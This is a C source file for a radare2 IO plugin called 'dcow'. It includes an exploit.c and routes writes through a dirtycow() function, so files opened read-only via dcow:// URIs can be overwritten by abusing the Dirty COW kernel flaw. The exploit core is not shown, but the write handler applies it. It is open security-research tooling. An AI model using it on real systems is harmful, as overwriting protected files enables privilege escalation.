/* radare - LGPL - Copyright 2016 - pancake@nowsecure.com */

#include <r_userconf.h>
#include <r_io.h>
#include <r_lib.h>
#include <stdbool.h>

static int LOOPS = 10000;
#include "exploit.c"

RIOPlugin r_io_plugin_dcow;

#define PERM_READ 4
#define PERM_WRITE 2
#define PERM_EXEC 1

typedef struct {
	char *name;
	ut64 from;
	ut64 to;
	int perm;
} RIOSelfSection;

typedef struct r_io_mmo_t {
	char *filename;
	int mode;
	int flags;
	int fd;
	int opened;
	ut8 modified;
	RBuffer *buf;
	RIO * io_backref;
	bool force_ptrace;
} RIOdcowFileObj;

static RIOSelfSection self_sections[1024];
static int self_sections_count = 0;

static int update_self_regions(RIO *io, int pid) {
	self_sections_count = 0;
	char *pos_c;
	int i, l, perm;
	char path[1024], line[1024];
	char region[100], region2[100], perms[5];
	snprintf (path, sizeof (path) - 1, "/proc/%d/maps", pid);
	FILE *fd = fopen (path, "r");
	if (!fd)
		return false;

	while (!feof (fd)) {
		line[0]='\0';
		fgets (line, sizeof (line)-1, fd);
		if (line[0] == '\0') {
			break;
		}
		path[0]='\0';
		sscanf (line, "%s %s %*s %*s %*s %[^\n]", region+2, perms, path);
		memcpy (region, "0x", 2);
		pos_c = strchr (region + 2, '-');
		if (pos_c) {
			*pos_c++ = 0;
			memcpy (region2, "0x", 2);
			l = strlen (pos_c);
			memcpy (region2 + 2, pos_c, l);
			region2[2 + l] = 0;
		} else {
			region2[0] = 0;
		}
		perm = 0;
		for (i = 0; i < 4 && perms[i]; i++) {
			switch (perms[i]) {
			case 'r': perm |= R_IO_READ; break;
			case 'w': perm |= R_IO_WRITE; break;
			case 'x': perm |= R_IO_EXEC; break;
			}
		}
		self_sections[self_sections_count].from = r_num_get (NULL, region);
		self_sections[self_sections_count].to = r_num_get (NULL, region2);
		self_sections[self_sections_count].name = strdup (path);
		self_sections[self_sections_count].perm = perm;
		self_sections_count++;
		r_num_get (NULL, region2);
	}
	fclose (fd);

	return true;
}

static int self_in_section(RIO *io, ut64 addr, int *left, int *perm) {
	int i;
	for (i = 0; i < self_sections_count; i++) {
		if (addr >= self_sections[i].from && addr < self_sections[i].to) {
			if (left) {
				*left = self_sections[i].to - addr;
			}
			if (perm) {
				*perm = self_sections[i].perm;
			}
			return true;
		}
	}
	return false;
}

static ut64 r_io_dcow_seek(RIO *io, RIOdcowFileObj *mmo, ut64 offset, int whence) {
	switch (whence) {
	case SEEK_SET:
		io->off = offset;
		break;
	case SEEK_CUR:
		io->off += offset;
		break;
	case SEEK_END:
		io->off = UT64_MAX;
		break;
	}
	return io->off;
}

static void r_io_dcow_free (RIOdcowFileObj *mmo) {
	free (mmo->filename);
	memset (mmo, 0, sizeof (RIOdcowFileObj));
	free (mmo);
}

RIOdcowFileObj *r_io_dcow_create_new_file(RIO  *io, const char *filename, int mode, int flags) {
	if (!io) {
		return NULL;
	}
	RIOdcowFileObj *mmo = R_NEW0 (RIOdcowFileObj);
	if (!mmo) {
		return NULL;
	}
	mmo->filename = filename? strdup (filename): NULL;
	mmo->fd = r_num_rand (0xFFFF); // XXX: Use r_io_fd api
	mmo->mode = mode;
	mmo->flags = flags;
	mmo->io_backref = io;
	return mmo;
}

static int r_io_dcow_check (const char *filename) {
	return (filename && !strncmp (filename, "dcow://", 7));
}

static RIODesc *r_io_dcow_open(RIO *io, const char *file, int flags, int mode) {
	const char* name = !strncmp (file, "dcow://", 7) ? file + 7 : file;
	if (name && *name) {
		int f = open (name, O_RDONLY);
		if (f == -1) {
			return NULL;
		}
		close (f);
	} else {
		name = NULL;
	}
	RIOdcowFileObj *mmo;
	if (!(mmo = r_io_dcow_create_new_file (io, name, mode, flags))) {
		return NULL;
	}
	(void)update_self_regions (io, getpid ());
	return r_io_desc_new (&r_io_plugin_dcow, mmo->fd,
		mmo->filename? mmo->filename: "(self)", flags, mode, mmo);
}

static bool __plugin_open(RIO *io, const char *file, bool many) {
	return r_io_dcow_check (file);
}

static RIODesc *__open(RIO *io, const char *file, int flags, int mode) {
	if (!r_io_dcow_check (file)) {
		return NULL;
	}
	return r_io_dcow_open (io, file, flags, mode);
}

static int __read(RIO *io, RIODesc *fd, ut8 *buf, int len) {
	if (!fd || !fd->data || !buf) {
		return -1;
	}
	ut64 off = io->off;
	RIOdcowFileObj *mmo = fd->data;
	if (mmo->filename) {
		int f = open (mmo->filename, O_RDONLY);
		if (f == -1) {
			return -1;
		}
		(void)lseek (f, io->off, SEEK_SET);
		len = read (f, buf, len);
		io->off = off;
		close (f);
	} else {
		int left, perm;
		if (self_in_section (io, io->off, &left, &perm)) {
			if (perm & R_IO_READ) {
				int newlen = R_MIN (len, left);
				ut8 *ptr = (ut8*)(size_t)io->off;
				memcpy (buf, ptr, newlen);
				return newlen;
			}
		}
	}
	return len;
}

static int __write(RIO *io, RIODesc *fd, const ut8 *buf, int len) {
	if (!io || !fd || !fd->data || !buf) {
		return -1;
	}
	RIOdcowFileObj *mmo = fd->data;
	int i;
	const int bs = 1024; // use pagesize here
	const char *file = mmo->filename;
	if (mmo->force_ptrace) {
		file = NULL;
	}
	for (i = 0; i < len; i+= bs) {
		int pc = i * 100 / len;
		eprintf ("\rDirtyCowing %d%% ", pc);
		dirtycow (file, io->off + i,
			buf + i, R_MIN (len - i, bs));
	}
	eprintf ("\rDirtyCowing 100%%\n");
	return len;
}

static ut64 __lseek(RIO *io, RIODesc *fd, ut64 offset, int whence) {
	if (!fd || !fd->data) {
		return -1;
	}
	RIOdcowFileObj *mmo = fd->data;
	return r_io_dcow_seek (io, mmo, offset, whence);
}

static int __close(RIODesc *fd) {
	if (!fd || !fd->data) {
		return -1;
	}
	r_io_dcow_free ((RIOdcowFileObj *) fd->data);
	fd->data = NULL;
	return 0;
}

static int __system(RIO *io, RIODesc *fd, const char *command) {
	if (!fd || !fd->data || !command) {
		return -1;
	}
	ut64 off = io->off;
	RIOdcowFileObj *mmo = fd->data;
	if (!strcmp (command, "?")) {
		eprintf ("Dirtycow IO commands:\n");
		eprintf ("=!loop        # show loop iterations to dirtycow\n");
		eprintf ("=!loop 10000  # change the amount of loops\n");
		eprintf ("=!ptrace      # use ptrace backend (experimental)\n");
		eprintf ("=!mmap        # use mmap backend (default)\n");
		eprintf ("=!maps        # list memory maps of current process (see =!ptrace)\n");
	} else if (!strcmp (command, "maps")) {
		int i;
		for (i = 0; i < self_sections_count; i++) {
			io->cb_printf ("0x%08"PFMT64x" - 0x%08"PFMT64x" %s %s\n",
				self_sections[i].from, self_sections[i].to,
				r_str_rwx_i (self_sections[i].perm),
				self_sections[i].name);
		}
	} else if (!strcmp (command, "ptrace")) {
		mmo->force_ptrace = true;
	} else if (!strcmp (command, "mmap")) {
		mmo->force_ptrace = false;
	} else if (!strncmp (command, "loop ", 5)) {
		LOOPS = atoi (command + 5);
	} else if (!strcmp (command, "loop")) {
		io->cb_printf ("%d\n", LOOPS);
	}
}

RIOPlugin r_io_plugin_dcow = {
	.name = "dcow",
	.desc = "dirty cow baked IO for r2 dcow://[path]",
	.license = "LGPL",
	.open = __open,
	.close = __close,
	.read = __read,
	.check = __plugin_open,
	.lseek = __lseek,
	.write = __write,
	.system = __system,
};

#ifndef CORELIB
RLibStruct radare_plugin = {
	.type = R_LIB_TYPE_IO,
	.data = &r_io_plugin_dcow,
	.version = R2_VERSION
};
#endif
